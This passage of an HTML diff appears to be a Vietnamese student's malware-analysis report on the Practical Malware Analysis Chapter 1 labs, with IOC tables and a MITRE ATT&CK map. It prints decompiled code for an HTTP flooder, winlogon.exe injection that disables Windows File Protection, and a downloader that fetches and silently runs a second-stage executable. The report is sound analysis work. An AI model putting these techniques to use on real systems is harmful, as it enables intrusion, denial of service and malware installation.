+  <span class="c-func">SystemTimeToFileTime</span>(&amp;SystemTime, &amp;FileTime);
+  WaitableTimerA = <span class="c-func">CreateWaitableTimerA</span>(NULL, FALSE, NULL);
+  <span class="c-func">SetWaitableTimer</span>(WaitableTimerA, &amp;FileTime, <span class="c-num">0</span>, NULL, NULL, FALSE);
+  <span class="c-func">WaitForSingleObject</span>(WaitableTimerA, INFINITE);
+
+  <span class="c-comm">// 4. Khởi tạo 20 luồng HTTP Flooder</span>
+  <span class="c-kw">for</span> ( i = <span class="c-num">20</span>; i != <span class="c-num">0</span>; --i )
+    <span class="c-func">CreateThread</span>(NULL, <span class="c-num">0</span>, StartAddress, NULL, <span class="c-num">0</span>, NULL);
+  <span class="c-kw">return</span> <span class="c-num">0</span>;
+}</code></pre>
+            </div>
+
+            <div class="code-viewer">
+              <div class="code-viewer-header">
+                <span class="code-viewer-title">Lab01-02.exe - Luồng Flooder (StartAddress: 0x00401150)</span>
+                <span class="badge-tag hash">IDA Hex-Rays</span>
+              </div>
+              <pre class="code-viewer-pre"><code><span class="c-type">void</span> __stdcall __noreturn <span class="c-func">StartAddress</span>(<span class="c-type">LPVOID</span> lpParam)
+{
+  <span class="c-type">void</span> *i;
+  <span class="c-comm">// Giả mạo User-Agent trình duyệt Internet Explorer 8.0</span>
+  i = <span class="c-func">InternetOpenA</span>(<span class="c-str">"Internet Explorer 8.0"</span>, INTERNET_OPEN_TYPE_PRECONFIG, ...);
+
+  <span class="c-comm">// Vòng lặp vô tận dội HTTP GET làm nghẽn máy chủ</span>
+  <span class="c-kw">while</span> ( <span class="c-num">1</span> )
+  {
+    <span class="c-func">InternetOpenUrlA</span>(
+      i, 
+      <span class="c-str">"http://www.malwareanalysisbook.com"</span>, 
+      NULL, 
+      <span class="c-num">0</span>, 
+      INTERNET_FLAG_RELOAD, 
+      <span class="c-num">0</span>
+    );
+  }
+}</code></pre>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- SUBTAB CONTENT: LAB 01-03 -->
+      <div id="lab01-03" class="subtab-content">
+        <div class="card">
+          <div class="card-header">
+            <div>
+              <h2 class="card-title">
+                <span class="badge-tag path">Lab 01-03</span>
+                Mã Độc Đóng Gói FSG & Ranh Giới Giới Hạn Của Phân Tích Tĩnh
+              </h2>
+              <div class="card-subtitle">Mục tiêu: <code>Lab01-03.exe</code> (Packed FSG 1.0/1.33: 4,752 B)</div>
+            </div>
+            <div>
+              <button class="btn btn-secondary copy-code-btn" data-code-target="code-lab3-stub">Sao Chép Mã Stub FSG</button>
+            </div>
+          </div>
+
+          <!-- Section Entropy Visualizer -->
+          <div class="entropy-meter-wrap">
+            <div style="font-weight: 700; font-size: 0.85rem; margin-bottom: 12px; color: var(--text-main);">
+              Cấu Trúc Phân Đoạn Bất Thường Của FSG (Fast Small Good Packer)
+            </div>
+            <div class="entropy-row">
+              <span class="entropy-name">seg000 (RAM Rỗng)</span>
+              <div class="entropy-bar-track"><div class="entropy-bar-fill normal" style="width: 1%;"></div></div>
+              <span class="entropy-val">0.00 (Virtual Size: 12KB)</span>
+            </div>
+            <div class="entropy-row">
+              <span class="entropy-name">seg001 (Data Nén)</span>
+              <div class="entropy-bar-track"><div class="entropy-bar-fill normal" style="width: 22%;"></div></div>
+              <span class="entropy-val">1.80 / 8.0</span>
+            </div>
+            <div class="entropy-row">
+              <span class="entropy-name">seg002 (Unpack Stub)</span>
+              <div class="entropy-bar-track"><div class="entropy-bar-fill danger" style="width: 72%;"></div></div>
+              <span class="entropy-val">5.74 / 8.0</span>
+            </div>
+          </div>
+
+          <!-- REA Analysis Card for Lab 01-03 -->
+          <div class="rea-grid" style="margin-top: 10px;">
+            <div class="rea-card obs">
+              <div class="rea-card-header">
+                <span class="rea-card-title">Dấu Hiệu Nhận Diện (Observations)</span>
+              </div>
+              <div class="rea-card-body">
+                <ul>
+                  <li><strong>Compile Timestamp</strong>: <code>1970-01-01 00:00:00 UTC</code> (Đã bị công cụ packer xóa về mốc Epoch 0 để che giấu nguồn gốc).</li>
+                  <li><strong>Bảng Import tối giản</strong>: Chỉ có duy nhất 2 API: <code>LoadLibraryA</code> và <code>GetProcAddress</code> trong <code>KERNEL32.dll</code>.</li>
+                  <li><strong>Phân đoạn lạ</strong>: <code>seg000</code>, <code>seg001</code>, <code>seg002</code> thay vì <code>.text</code>, <code>.data</code> thông thường.</li>
+                </ul>
+              </div>
+            </div>
+            <div class="rea-card inf">
+              <div class="rea-card-header">
+                <span class="rea-card-title">Ý Nghĩa Sư Phạm & Ranh Giới REA</span>
+              </div>
+              <div class="rea-card-body">
+                <ul>
+                  <li><strong>Giới hạn phân tích tĩnh</strong>: Không thể phân tích chuỗi ký tự hay hàm logic bên trong vì toàn bộ mã đã bị mã hóa nén bằng thuật toán aPLib.</li>
+                  <li><strong>Chuyển giao phân tích động</strong>: Chuyên viên bắt buộc phải dùng Debugger (x64dbg / OllyDbg), đặt breakpoint tại OEP <code>0x00401090</code> và dùng công cụ Scylla để dump và sửa lại IAT.</li>
+                </ul>
+              </div>
+            </div>
+          </div>
+
+          <!-- Hex-Rays Pseudocode Viewers -->
+          <div class="code-viewer">
+            <div class="code-viewer-header">
+              <span class="code-viewer-title">Lab01-03.exe - Stub Giải Nén FSG (start: 0x00405000 & sub_40501F)</span>
+              <span class="badge-tag hash">IDA Decompiler</span>
+            </div>
+            <pre class="code-viewer-pre" id="code-lab3-stub"><code><span class="c-type">int</span> <span class="c-func">start</span>()
+{
+  <span class="c-comm">// Khởi động bộ giải nén aPLib của FSG</span>
+  <span class="c-kw">return</span> <span class="c-func">sub_40501F</span>(<span class="c-num">4194768</span>);
+}
+
+<span class="c-comm">// Giải thuật aPLib giải nén bộ nhớ vào seg000 (0x00401000):</span>
+<span class="c-comm">// 1. Vòng lặp giải nén byte stream bằng các phép toán shr, adc, rol</span>
+<span class="c-comm">// 2. Đọc bảng tên thư viện để tự động nạp dynamic IAT qua LoadLibraryA/GetProcAddress</span>
+<span class="c-comm">// 3. Khi hoàn tất, stub thực hiện bước nhảy quyết định đến OEP:</span>
+<span class="c-kw">JUMPOUT</span>(<span class="c-num">0x401090</span>); <span class="c-comm">// Original Entry Point = 0x00401090</span></code></pre>
+          </div>
+        </div>
+      </div>
+
+      <!-- SUBTAB CONTENT: LAB 01-04 -->
+      <div id="lab01-04" class="subtab-content">
+        <div class="card">
+          <div class="card-header">
+            <div>
+              <h2 class="card-title">
+                <span class="badge-tag path">Lab 01-04</span>
+                Process Injection Vào winlogon.exe, Tắt WFP & Thả Trojan Downloader (Resource #101)
+              </h2>
+              <div class="card-subtitle">Mục tiêu: <code>Lab01-04.exe</code> (36,864 B) & Payload nhúng <code>Resource #101</code> (20,384 B)</div>
+            </div>
+            <div>
+              <button class="btn btn-secondary copy-code-btn" data-code-target="code-lab4-main">Sao Chép Mã Hex-Rays</button>
+            </div>
+          </div>
+
+          <!-- Flowchart Steps -->
+          <div style="margin: 20px 0;">
+            <div style="font-weight: 700; font-size: 0.95rem; margin-bottom: 12px; color: var(--text-main);">
+              Chuỗi Tấn Công Phức Hợp (Multi-stage Attack Chain)
+            </div>
+            <div class="flow-step-box">
+              <div class="flow-node warning">
+                <div>
+                  <div class="flow-node-title">
+                    <span class="badge-tag hash">Bước 1</span> Nạp Động PSAPI & Tìm PID Của winlogon.exe
+                  </div>
+                  <div class="flow-node-desc">Gọi <code>EnumProcesses</code> và <code>GetModuleBaseNameA</code> để dò tìm tiến trình hệ thống trọng yếu <code>winlogon.exe</code>.</div>
+                </div>
+                <span class="flow-node-tag">psapi.dll</span>
+              </div>
+              <div class="flow-arrow-down">↓</div>
+              <div class="flow-node danger">
+                <div>
+                  <div class="flow-node-title">
+                    <span class="badge-tag path">Bước 2</span> Bật SeDebugPrivilege & Tiêm Thread Tắt WFP
+                  </div>
+                  <div class="flow-node-desc">Dùng <code>AdjustTokenPrivileges</code> nâng đặc quyền, nạp <code>sfc_os.dll</code>, lấy hàm Ordinal #2 và gọi <code>CreateRemoteThread</code> vào <code>winlogon.exe</code> để tắt Windows File Protection.</div>
+                </div>
+                <span class="flow-node-tag">CreateRemoteThread</span>
+              </div>
+              <div class="flow-arrow-down">↓</div>
+              <div class="flow-node purple">
+                <div>
+                  <div class="flow-node-title">
+                    <span class="badge-tag svc">Bước 3</span> Đánh Tráo wupdmgr.exe Bằng Resource #101 Độc Hại
+                  </div>
+                  <div class="flow-node-desc">Di chuyển <code>wupdmgr.exe</code> thật vào <code>%TEMP%\winup.exe</code>. Dùng <code>FindResourceA("#101")</code> trích xuất binary nhúng đè vào <code>C:\windows\system32\wupdmgr.exe</code>.</div>
+                </div>
+                <span class="flow-node-tag">MoveFileA / WriteFile</span>
+              </div>
+              <div class="flow-arrow-down">↓</div>
+              <div class="flow-node success">
+                <div>
+                  <div class="flow-node-title">
+                    <span class="badge-tag net">Bước 4</span> Payload Giai Đoạn 2 Tải updater.exe
+                  </div>
+                  <div class="flow-node-desc">Chạy <code>winup.exe</code> che mắt người dùng. Gọi <code>URLDownloadToFileA</code> tải mã độc từ <code>practicalmalwareanalysis.com/updater.exe</code> về lưu thành <code>wupdmgrd.exe</code> và kích hoạt.</div>
+                </div>
+                <span class="flow-node-tag">URLDownloadToFileA</span>
+              </div>
+            </div>
+          </div>
+
+          <!-- Hex-Rays Pseudocode Viewers -->
+          <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(400px, 1fr)); gap: 16px;">
+            <div class="code-viewer">
+              <div class="code-viewer-header">
+                <span class="code-viewer-title">Lab01-04.exe - Tắt WFP & Inject (sub_401174)</span>
+                <span class="badge-tag hash">IDA Hex-Rays</span>
+              </div>
+              <pre class="code-viewer-pre" id="code-lab4-main"><code><span class="c-type">int</span> __cdecl <span class="c-func">sub_401174</span>(<span class="c-type">DWORD</span> dwProcessId)
+{
+  <span class="c-comm">// 1. Nâng đặc quyền can thiệp hệ thống</span>
+  <span class="c-kw">if</span> ( <span class="c-func">sub_4010FC</span>(<span class="c-str">"SeDebugPrivilege"</span>) != <span class="c-num">0</span> )
+    <span class="c-kw">return</span> <span class="c-num">0</span>;
+
+  <span class="c-comm">// 2. Lấy hàm Export Ordinal #2 trong sfc_os.dll (Tắt WFP)</span>
+  LibraryA = <span class="c-func">LoadLibraryA</span>(<span class="c-str">"sfc_os.dll"</span>);
+  lpStartAddress = (<span class="c-type">LPTHREAD_START_ROUTINE</span>)<span class="c-func">GetProcAddress</span>(LibraryA, (<span class="c-type">LPCSTR</span>)<span class="c-num">2</span>);
+
+  <span class="c-comm">// 3. Mở winlogon.exe với toàn quyền can thiệp</span>
+  hProcess = <span class="c-func">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
+
+  <span class="c-comm">// 4. Tạo thread từ xa trong winlogon.exe để dập WFP</span>
+  <span class="c-func">CreateRemoteThread</span>(hProcess, NULL, <span class="c-num">0</span>, lpStartAddress, NULL, <span class="c-num">0</span>, NULL);
+  <span class="c-kw">return</span> <span class="c-num">1</span>;
+}</code></pre>
+            </div>
+
+            <div class="code-viewer">
+              <div class="code-viewer-header">
+                <span class="code-viewer-title">Payload Nhúng (Resource #101) - Hàm main</span>
+                <span class="badge-tag hash">IDA Hex-Rays</span>
+              </div>
+              <pre class="code-viewer-pre"><code><span class="c-type">int</span> __cdecl <span class="c-func">main</span>(<span class="c-type">int</span> argc, <span class="c-type">const char</span> **argv)
+{
+  <span class="c-comm">// 1. Chạy file gốc %TEMP%\winup.exe che mắt người dùng</span>
+  <span class="c-func">GetTempPathA</span>(<span class="c-num">270</span>, Buffer);
+  <span class="c-func">snprintf</span>(CmdLine, <span class="c-num">270</span>, <span class="c-str">"%s\\winup.exe"</span>, Buffer);
+  <span class="c-func">WinExec</span>(CmdLine, SW_SHOW);
+
+  <span class="c-comm">// 2. Tải mã độc giai đoạn 2 về system32\wupdmgrd.exe</span>
+  <span class="c-func">GetWindowsDirectoryA</span>(v5, <span class="c-num">270</span>);
+  <span class="c-func">snprintf</span>(v4, <span class="c-num">270</span>, <span class="c-str">"%s\\system32\\wupdmgrd.exe"</span>, v5);
+  <span class="c-kw">if</span> ( <span class="c-func">URLDownloadToFileA</span>(
+         NULL, 
+         <span class="c-str">"http://www.practicalmalwareanalysis.com/updater.exe"</span>, 
+         v4, <span class="c-num">0</span>, NULL) == <span class="c-num">0</span> )
+  {
+    <span class="c-comm">// Kích hoạt âm thầm payload mới</span>
+    <span class="c-func">WinExec</span>(v4, SW_HIDE);
+  }
+  <span class="c-kw">return</span> <span class="c-num">0</span>;
+}</code></pre>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ========================================================================
+         TAB 3: BẢNG CHỈ SỐ NHẬN DIỆN MÃ ĐỘC (IOCs)
+         ======================================================================== -->
+    <section id="tab-iocs" class="tab-content">
+      <div class="card">
+        <div class="card-header">
+          <div>
+            <h2 class="card-title">
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+              Kho Chỉ Số Nhận Diện Xâm Nhập (Indicators of Compromise - IOCs)
+            </h2>
+            <div class="card-subtitle">Tổng hợp toàn diện 22 chỉ số hashes, đường dẫn tệp bị thả, mutex, service và địa chỉ mạng</div>
+          </div>
+          <button class="btn btn-primary" onclick="copyAllIOCs()">
+            <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+            Sao Chép Tất Cả (22 IOCs)
+          </button>
+        </div>
+
+        <!-- Search & Filter Toolbar -->
+        <div class="table-toolbar">
+          <div class="search-input-wrap">
+            <svg class="search-icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
+            <input type="text" id="ioc-search" class="search-input" placeholder="Tìm kiếm theo mã hash, tên file, IP, Mutex hoặc từ khóa...">
+          </div>
+          <div class="filter-pills">
+            <button class="filter-pill active" data-filter="all">Tất Cả (22)</button>
+            <button class="filter-pill" data-filter="hash">Hashes (7)</button>
+            <button class="filter-pill" data-filter="path">Files & Thư Mục (5)</button>
+            <button class="filter-pill" data-filter="net">Mạng & C2 (4)</button>
+            <button class="filter-pill" data-filter="svc">Service & Mutex (6)</button>
+          </div>
+        </div>
+
+        <!-- IOCs Data Table -->
+        <div class="table-responsive">
+          <table class="data-table">
+            <thead>
+              <tr>
+                <th>Phân Loại</th>
+                <th>Giá Trị Chỉ Số (Indicator Value)</th>
+                <th>Lab Liên Quan</th>
+                <th>Ý Nghĩa / Ngữ Cảnh Hoạt Động</th>
+                <th>Thao Tác</th>
+              </tr>
+            </thead>
+            <tbody id="ioc-table-body">
+              <!-- Hashes -->
+              <tr data-category="hash">
+                <td><span class="badge-tag hash">MD5 Hash</span></td>
+                <td><span class="val-hash">bb7425b82141a1c0f7d60e5106676bb1</span></td>
+                <td>Lab 01-01</td>
+                <td>File thực thi <code>Lab01-01.exe</code> (PE Infector)</td>
+                <td><button class="copy-mini-btn" onclick="copyToClipboard('bb7425b82141a1c0f7d60e5106676bb1')">Copy</button></td>
+              </tr>
+              <tr data-category="hash">
+                <td><span class="badge-tag hash">SHA-256</span></td>
+                <td><span class="val-hash">58898bd42c5bd3bf9b1389f0eee5b39cd59180e8370eb9ea838a0b327bd6fe47</span></td>
+                <td>Lab 01-01</td>
+                <td>File thực thi <code>Lab01-01.exe</code></td>
+                <td><button class="copy-mini-btn" onclick="copyToClipboard('58898bd42c5bd3bf9b1389f0eee5b39cd59180e8370eb9ea838a0b327bd6fe47')">Copy</button></td>
+              </tr>
+              <tr data-category="hash">
+                <td><span class="badge-tag hash">MD5 Hash</span></td>
+                <td><span class="val-hash">290934c61de9176ad682ffdd65f0a669</span></td>
+                <td>Lab 01-01</td>
+                <td>File thư viện <code>Lab01-01.dll</code> (C2 Backdoor)</td>
+                <td><button class="copy-mini-btn" onclick="copyToClipboard('290934c61de9176ad682ffdd65f0a669')">Copy</button></td>
+              </tr>
+              <tr data-category="hash">
+                <td><span class="badge-tag hash">SHA-256</span></td>
+                <td><span class="val-hash">f50e42c8dd0ab5116709756c215fa127d140e72c842b0c36b85d398f6556eb14</span></td>
+                <td>Lab 01-01</td>
+                <td>File thư viện <code>Lab01-01.dll</code></td>
+                <td><button class="copy-mini-btn" onclick="copyToClipboard('f50e42c8dd0ab5116709756c215fa127d140e72c842b0c36b85d398f6556eb14')">Copy</button></td>
+              </tr>
+              <tr data-category="hash">
+                <td><span class="badge-tag hash">MD5 Hash</span></td>
+                <td><span class="val-hash">8363436878404da0ae3e46991e355b83</span></td>
+                <td>Lab 01-02</td>
+                <td>File nguyên bản đóng gói UPX 3.04 (3,072 bytes)</td>
+                <td><button class="copy-mini-btn" onclick="copyToClipboard('8363436878404da0ae3e46991e355b83')">Copy</button></td>
+              </tr>
+              <tr data-category="hash">
+                <td><span class="badge-tag hash">MD5 Hash</span></td>
+                <td><span class="val-hash">ae4ca70697df5506bc610172cfc288e7</span></td>
+                <td>Lab 01-02</td>
+                <td>Bản giải nén <code>Lab01-02_unpacked.exe</code> (16,384 bytes)</td>
+                <td><button class="copy-mini-btn" onclick="copyToClipboard('ae4ca70697df5506bc610172cfc288e7')">Copy</button></td>
+              </tr>
+              <tr data-category="hash">
+                <td><span class="badge-tag hash">MD5 Hash</span></td>
+                <td><span class="val-hash">9c5c27494c28ed0b14853b346b113145</span></td>
+                <td>Lab 01-03</td>
+                <td>File đóng gói FSG 1.0 (4,752 bytes)</td>
+                <td><button class="copy-mini-btn" onclick="copyToClipboard('9c5c27494c28ed0b14853b346b113145')">Copy</button></td>
+              </tr>
+              <tr data-category="hash">
+                <td><span class="badge-tag hash">MD5 Hash</span></td>
+                <td><span class="val-hash">625ac05fd47adc3c63700c3b30de79ab</span></td>
+                <td>Lab 01-04</td>
+                <td>File thực thi <code>Lab01-04.exe</code> (Injector / Dropper)</td>
+                <td><button class="copy-mini-btn" onclick="copyToClipboard('625ac05fd47adc3c63700c3b30de79ab')">Copy</button></td>
+              </tr>
+              <tr data-category="hash">
+                <td><span class="badge-tag hash">MD5 Hash</span></td>
+                <td><span class="val-hash">ee5a2eaddb0050ea8d1c54a7811db9ab</span></td>
+                <td>Lab 01-04</td>
+                <td>Payload nhúng trong Resource #101 (20,384 bytes)</td>
+                <td><button class="copy-mini-btn" onclick="copyToClipboard('ee5a2eaddb0050ea8d1c54a7811db9ab')">Copy</button></td>
+              </tr>
+
+              <!-- Paths -->
+              <tr data-category="path">
+                <td><span class="badge-tag path">Dropped File</span></td>
+                <td><code>C:\windows\system32\kerne132.dll</code></td>
+                <td>Lab 01-01</td>
+                <td>DLL proxy độc hại ngụy trang Typosquatting (chữ 'l' thành '1')</td>
+                <td><button class="copy-mini-btn" onclick="copyToClipboard('C:\\windows\\system32\\kerne132.dll')">Copy</button></td>
+              </tr>
+              <tr data-category="path">
+                <td><span class="badge-tag path">Temp Backup</span></td>
+                <td><code>%TEMP%\winup.exe</code></td>
+                <td>Lab 01-04</td>
+                <td>Bản sao lưu tạm của <code>wupdmgr.exe</code> thật để đánh lừa người dùng</td>
+                <td><button class="copy-mini-btn" onclick="copyToClipboard('%TEMP%\\winup.exe')">Copy</button></td>
+              </tr>
+              <tr data-category="path">
+                <td><span class="badge-tag path">Hijacked Target</span></td>
+                <td><code>C:\windows\system32\wupdmgr.exe</code></td>
+                <td>Lab 01-04</td>
+                <td>File Windows Update thật bị thay thế bằng Trojan Downloader</td>
+                <td><button class="copy-mini-btn" onclick="copyToClipboard('C:\\windows\\system32\\wupdmgr.exe')">Copy</button></td>
+              </tr>
+              <tr data-category="path">
+                <td><span class="badge-tag path">Dropped Payload</span></td>
+                <td><code>C:\windows\system32\wupdmgrd.exe</code></td>
+                <td>Lab 01-04</td>
+                <td>Mã độc giai đoạn 2 tải về từ Internet và được thực thi ẩn</td>
+                <td><button class="copy-mini-btn" onclick="copyToClipboard('C:\\windows\\system32\\wupdmgrd.exe')">Copy</button></td>
+              </tr>
+
+              <!-- Network -->
+              <tr data-category="net">
+                <td><span class="badge-tag net">C2 Socket</span></td>
+                <td><code>127.26.152.13:80</code> (TCP)</td>
+                <td>Lab 01-01</td>
+                <td>Máy chủ điều khiển C2 nhận beacon <code>hello</code> và phát lệnh <code>exec</code></td>
+                <td><button class="copy-mini-btn" onclick="copyToClipboard('127.26.152.13:80')">Copy</button></td>
+              </tr>
+              <tr data-category="net">
+                <td><span class="badge-tag net">DDoS Target</span></td>
+                <td><code>http://www.malwareanalysisbook.com</code></td>
+                <td>Lab 01-02</td>
+                <td>Mục tiêu bị 20 luồng HTTP Flooder dội yêu cầu liên tục</td>
+                <td><button class="copy-mini-btn" onclick="copyToClipboard('http://www.malwareanalysisbook.com')">Copy</button></td>
+              </tr>
+              <tr data-category="net">
+                <td><span class="badge-tag net">Payload URL</span></td>
+                <td><code>http://www.practicalmalwareanalysis.com/updater.exe</code></td>
+                <td>Lab 01-04</td>
+                <td>URL chứa mã độc giai đoạn 2 tải qua <code>URLDownloadToFileA</code></td>
+                <td><button class="copy-mini-btn" onclick="copyToClipboard('http://www.practicalmalwareanalysis.com/updater.exe')">Copy</button></td>
+              </tr>
+              <tr data-category="net">
+                <td><span class="badge-tag net">User-Agent</span></td>
+                <td><code>Internet Explorer 8.0</code></td>
+                <td>Lab 01-02</td>
+                <td>Chuỗi nhận diện HTTP giả lập trình duyệt</td>
+                <td><button class="copy-mini-btn" onclick="copyToClipboard('Internet Explorer 8.0')">Copy</button></td>
+              </tr>
+
+              <!-- Services & Mutex -->
+              <tr data-category="svc">
+                <td><span class="badge-tag svc">Windows Service</span></td>
+                <td><code>MalService</code> (Tên hiển thị: <code>Malservice</code>)</td>
+                <td>Lab 01-02</td>
+                <td>Dịch vụ Windows tự động khởi động cùng hệ thống (Auto-Start)</td>
+                <td><button class="copy-mini-btn" onclick="copyToClipboard('MalService')">Copy</button></td>
+              </tr>
+              <tr data-category="svc">
+                <td><span class="badge-tag mtx">Mutex Object</span></td>
+                <td><code>SADFHUHF</code></td>
+                <td>Lab 01-01</td>
+                <td>Mutex ngăn ngừa chạy trùng phiên của <code>Lab01-01.dll</code></td>
+                <td><button class="copy-mini-btn" onclick="copyToClipboard('SADFHUHF')">Copy</button></td>
+              </tr>
+              <tr data-category="svc">
+                <td><span class="badge-tag mtx">Mutex Object</span></td>
+                <td><code>HGL345</code></td>
+                <td>Lab 01-02</td>
+                <td>Mutex ngăn ngừa chạy trùng phiên của <code>Lab01-02.exe</code></td>
+                <td><button class="copy-mini-btn" onclick="copyToClipboard('HGL345')">Copy</button></td>
+              </tr>
+              <tr data-category="svc">
+                <td><span class="badge-tag path">CLI Safety Lock</span></td>
+                <td><code>WARNING_THIS_WILL_DESTROY_YOUR_MACHINE</code></td>
+                <td>Lab 01-01</td>
+                <td>Tham số dòng lệnh kích hoạt cơ chế lây nhiễm</td>
+                <td><button class="copy-mini-btn" onclick="copyToClipboard('WARNING_THIS_WILL_DESTROY_YOUR_MACHINE')">Copy</button></td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </section>
+
+    <!-- ========================================================================
+         TAB 4: MA TRẬN MITRE ATT&CK
+         ======================================================================== -->
+    <section id="tab-mitre" class="tab-content">
+      <div class="card">
+        <div class="card-header">
+          <div>
+            <h2 class="card-title">
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><line x1="22" y1="12" x2="18" y2="12"></line><line x1="6" y1="12" x2="2" y2="12"></line><line x1="12" y1="6" x2="12" y2="2"></line><line x1="12" y1="22" x2="12" y2="18"></line></svg>
+              Ma Trận Chiến Thuật MITRE ATT&CK Cho Chapter 1
+            </h2>
+            <div class="card-subtitle">Ánh xạ các kỹ thuật dịch ngược sang khung phòng thủ an ninh mạng quốc tế</div>
+          </div>
+          <span class="badge-tag svc">Enterprise ATT&CK Matrix</span>
+        </div>
+
+        <div class="mitre-grid">
+          <!-- Execution -->
+          <div class="mitre-column">
+            <div class="mitre-header">1. Thực Thi (Execution)</div>
+            <div class="mitre-item">
+              <div class="mitre-id">T1059.003</div>
+              <div class="mitre-name">Windows Command Shell</div>
+              <div class="mitre-detail"><code>Lab01-01.dll</code> gọi <code>CreateProcessA</code> với cờ ẩn <code>CREATE_NO_WINDOW</code> để thực thi lệnh <code>exec</code> từ C2.</div>
+            </div>
+            <div class="mitre-item">
+              <div class="mitre-id">T1204.002</div>
+              <div class="mitre-name">Malicious File</div>
+              <div class="mitre-detail">Chạy mồi <code>winup.exe</code> để người dùng tin tưởng trong khi âm thầm thả payload độc.</div>
+            </div>
+          </div>
+
+          <!-- Persistence -->
+          <div class="mitre-column">
+            <div class="mitre-header">2. Duy Trì (Persistence)</div>
+            <div class="mitre-item">
+              <div class="mitre-id">T1543.003</div>
+              <div class="mitre-name">Windows Service</div>
+              <div class="mitre-detail"><code>Lab01-02.exe</code> tự đăng ký <code>MalService</code> ở chế độ <code>SERVICE_AUTO_START</code> duy trì qua các lần reboot.</div>
+            </div>
+            <div class="mitre-item">
+              <div class="mitre-id">T1574.001</div>
+              <div class="mitre-name">DLL Search Order Hijacking</div>
+              <div class="mitre-detail"><code>Lab01-01.exe</code> thả <code>kerne132.dll</code> vào System32 và sửa IAT toàn bộ file .exe trên ổ C:.</div>
+            </div>
+          </div>
+
+          <!-- Privilege Escalation -->
+          <div class="mitre-column">
+            <div class="mitre-header">3. Leo Thang (Privilege)</div>
+            <div class="mitre-item">
+              <div class="mitre-id">T1134.001</div>
+              <div class="mitre-name">Token Impersonation / SeDebug</div>
+              <div class="mitre-detail"><code>Lab01-04.exe</code> gọi <code>AdjustTokenPrivileges</code> để kích hoạt đặc quyền <code>SeDebugPrivilege</code> can thiệp tiến trình khác.</div>
+            </div>
+            <div class="mitre-item">
+              <div class="mitre-id">T1055.002</div>
+              <div class="mitre-name">Portable Executable Injection</div>
+              <div class="mitre-detail">Mở tiến trình <code>winlogon.exe</code> và gọi <code>CreateRemoteThread</code> kích hoạt tắt Windows File Protection.</div>
+            </div>
+          </div>
+
+          <!-- Defense Evasion -->
+          <div class="mitre-column">
+            <div class="mitre-header">4. Lẩn Tránh (Defense Evasion)</div>
+            <div class="mitre-item">
+              <div class="mitre-id">T1027.002</div>
+              <div class="mitre-name">Software Packing</div>
+              <div class="mitre-detail">UPX 3.04 (Lab 01-02) và FSG 1.0 (Lab 01-03) che giấu chuỗi ký tự và bảng Import table khỏi phân tích tĩnh.</div>
+            </div>
+            <div class="mitre-item">
+              <div class="mitre-id">T1562.001</div>
+              <div class="mitre-name">Disable Security Tools</div>
+              <div class="mitre-detail">Gọi hàm ẩn Ordinal #2 trong <code>sfc_os.dll</code> để tắt WFP bảo vệ thư mục System32.</div>
+            </div>
+            <div class="mitre-item">
+              <div class="mitre-id">T1036.005</div>
+              <div class="mitre-name">Masquerading: Typosquatting</div>
+              <div class="mitre-detail">Ngụy trang <code>kernel32.dll</code> thành <code>kerne132.dll</code> để đánh lừa mắt thường của người quản trị.</div>
+            </div>
+          </div>
+
+          <!-- Command and Control -->
+          <div class="mitre-column">
+            <div class="mitre-header">5. Điều Khiển (C2)</div>
+            <div class="mitre-item">
+              <div class="mitre-id">T1095</div>
+              <div class="mitre-name">Non-Application Layer Protocol</div>
+              <div class="mitre-detail">Kết nối raw TCP socket tới <code>127.26.152.13:80</code>, gửi beacon <code>hello</code> và lắng nghe lệnh shell.</div>
+            </div>
+            <div class="mitre-item">
+              <div class="mitre-id">T1105</div>
+              <div class="mitre-name">Ingress Tool Transfer</div>
+              <div class="mitre-detail">Resource #101 gọi <code>URLDownloadToFileA</code> tải payload độc hại giai đoạn 2 từ Internet.</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ========================================================================
+         TAB 5: KỊCH BẢN QUAY VIDEO THUYẾT MINH (TELEPROMPTER STUDIO)
+         ======================================================================== -->
+    <section id="tab-presentation" class="tab-content">
+      
+      <!-- Studio Control Bar -->
+      <div class="studio-bar">
+        <div>
+          <h2 style="font-size: 1.4rem; font-weight: 800; display: flex; align-items: center; gap: 10px;">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor"><polygon points="5 3 19 12 5 21 5 3"></polygon></svg>
+            Studio Thuyết Minh & Quay Video Báo Cáo
+          </h2>
+          <div style="font-size: 0.85rem; color: #94a3b8; margin-top: 4px;">
+            Hỗ trợ sinh viên <strong>Huỳnh Ngọc Hiếu</strong> quay video phân tích nộp bài chuẩn chỉnh từ 8 - 12 phút theo yêu cầu của Giảng viên.
+          </div>
+        </div>
+
+        <div class="stopwatch-box">
+          <div class="stopwatch-display" id="stopwatch-timer">00:00</div>
+          <div class="stopwatch-controls">
+            <button class="btn btn-primary" id="sw-start-btn">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><polygon points="5 3 19 12 5 21 5 3"></polygon></svg>
+              Bắt Đầu Quay
+            </button>
+            <button class="btn btn-secondary" id="sw-reset-btn">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M2.5 2v6h6M21.5 22v-6h-6"/><path d="M22 11.5A10 10 0 0 0 3.2 7.2M2 12.5a10 10 0 0 0 18.8 4.2"/></svg>
+              Đặt Lại
+            </button>
+          </div>
+        </div>
+      </div>
+
+      <!-- Presentation Segments Timeline -->
